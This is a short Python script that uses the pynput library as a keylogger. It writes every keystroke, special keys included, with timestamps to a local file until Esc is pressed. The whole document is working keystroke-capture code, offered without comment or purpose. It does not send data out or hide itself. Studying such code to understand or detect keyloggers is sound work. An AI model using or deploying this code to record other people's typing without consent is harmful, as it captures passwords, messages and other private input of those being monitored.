from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
